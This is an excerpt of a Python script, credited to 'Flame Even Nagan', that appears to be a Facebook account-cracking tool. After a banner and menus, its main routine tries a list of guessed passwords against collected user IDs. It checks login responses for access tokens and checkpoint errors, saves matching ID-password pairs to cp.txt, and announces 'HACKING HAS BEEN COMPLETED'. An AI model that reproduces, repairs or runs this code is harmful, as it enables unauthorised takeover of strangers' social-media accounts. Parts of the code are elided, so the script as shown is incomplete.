...
#AUTHOR : FLAME EVEN NAGAN 
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO FLAME EVEN NAGAN 
...
def logo():
	os.system('echo "\n 
     ...
     EEEEEEEEEEEEEEEEEEEEEEVVVVVVVV           VVVVVVVVEEEEEEEEEEEEEEEEEEEEEENNNNNNNN        NNNNNNNN     NNNNNNNN        NNNNNNNN               AAA                  GGGGGGGGGGGGG               AAA               NNNNNNNN        NNNNNNNN
     E::::::::::::::::::::EV::::::V           V::::::VE::::::::::::::::::::EN:::::::N       N::::::N     N:::::::N       N::::::N              A:::A              GGG::::::::::::G              A:::A              N:::::::N       N::::::N
     E::::::::::::::::::::EV::::::V           V::::::VE::::::::::::::::::::EN::::::::N      N::::::N     N::::::::N      N::::::N             A:::::A           GG:::::::::::::::G             A:::::A             N::::::::N      N::::::N
     EE::::::EEEEEEEEE::::EV::::::V           V::::::VEE::::::EEEEEEEEE::::EN:::::::::N     N::::::N     N:::::::::N     N::::::N            A:::::::A         G:::::GGGGGGGG::::G            A:::::::A            N:::::::::N     N::::::N
       E:::::E       EEEEEE V:::::V           V:::::V   E:::::E       EEEEEEN::::::::::N    N::::::N     N::::::::::N    N::::::N           A:::::::::A       G:::::G       GGGGGG           A:::::::::A           N::::::::::N    N::::::N
       E:::::E               V:::::V         V:::::V    E:::::E             N:::::::::::N   N::::::N     N:::::::::::N   N::::::N          A:::::A:::::A     G:::::G                        A:::::A:::::A          N:::::::::::N   N::::::N
       E::::::EEEEEEEEEE      V:::::V       V:::::V     E::::::EEEEEEEEEE   N:::::::N::::N  N::::::N     N:::::::N::::N  N::::::N         A:::::A A:::::A    G:::::G                       A:::::A A:::::A         N:::::::N::::N  N::::::N
       E:::::::::::::::E       V:::::V     V:::::V      E:::::::::::::::E   N::::::N N::::N N::::::N     N::::::N N::::N N::::::N        A:::::A   A:::::A   G:::::G    GGGGGGGGGG        A:::::A   A:::::A        N::::::N N::::N N::::::N
       E:::::::::::::::E        V:::::V   V:::::V       E:::::::::::::::E   N::::::N  N::::N:::::::N     N::::::N  N::::N:::::::N       A:::::A     A:::::A  G:::::G    G::::::::G       A:::::A     A:::::A       N::::::N  N::::N:::::::N
       E::::::EEEEEEEEEE         V:::::V V:::::V        E::::::EEEEEEEEEE   N::::::N   N:::::::::::N     N::::::N   N:::::::::::N      A:::::AAAAAAAAA:::::A G:::::G    GGGGG::::G      A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N
       E:::::E                    V:::::V:::::V         E:::::E             N::::::N    N::::::::::N     N::::::N    N::::::::::N     A:::::::::::::::::::::AG:::::G        G::::G     A:::::::::::::::::::::A     N::::::N    N::::::::::N
       E:::::E       EEEEEE        V:::::::::V          E:::::E       EEEEEEN::::::N     N:::::::::N     N::::::N     N:::::::::N    A:::::AAAAAAAAAAAAA:::::AG:::::G       G::::G    A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N
     EE::::::EEEEEEEE:::::E         V:::::::V         EE::::::EEEEEEEE:::::EN::::::N      N::::::::N     N::::::N      N::::::::N   A:::::A             A:::::AG:::::GGGGGGGG::::G   A:::::A             A:::::A   N::::::N      N::::::::N
     E::::::::::::::::::::E          V:::::V          E::::::::::::::::::::EN::::::N       N:::::::N     N::::::N       N:::::::N  A:::::A               A:::::AGG:::::::::::::::G  A:::::A               A:::::A  N::::::N       N:::::::N
     E::::::::::::::::::::E           V:::V           E::::::::::::::::::::EN::::::N        N::::::N     N::::::N        N::::::N A:::::A                 A:::::A GGG::::::GGG:::G A:::::A                 A:::::A N::::::N        N::::::N
     EEEEEEEEEEEEEEEEEEEEEE            VVV            EEEEEEEEEEEEEEEEEEEEEENNNNNNNN         NNNNNNN     NNNNNNNN         NNNNNNNAAAAAAA                   AAAAAAA   GGGGGG   GGGGAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN
    ...
    ╔═════════════════════════════╗\n    ║ TOOL NAME: {FLAME EVEN NAGAN }        ║\n    ║ AUTHOR   : 🔥 FLAME EVEN NAGAN  X AZIM VAU🔥       ║\n    ║ GITHUB   : git.io/EVEN NAGAN 75o     ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			xox("\033[92;1m\n FLAME EVEN NAGAN  UPDATE SUCCESSFUL :)\n")
			time.sleep(2)
			main()
...
def menu():
    ...
    logo()
    print("")
    print("\033[93;1m     FLAME EVEN NAGAN  : \033[92;1m"+xn)
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		print("\t\033[92;1m FLAME EVEN NAGAN  PUBLIC ID COINING ")
		print("")
		try:
	...
	print("\033[94;1m  WAIT AND SEE FLAME EVEN NAGAN  MAGIC\033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[EVEN NAGAN -CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
	...
	linex()
	print("")
	print("\033[92;1m FLAME EVEN NAGAN  HACKING HAS BEEN COMPLETED")
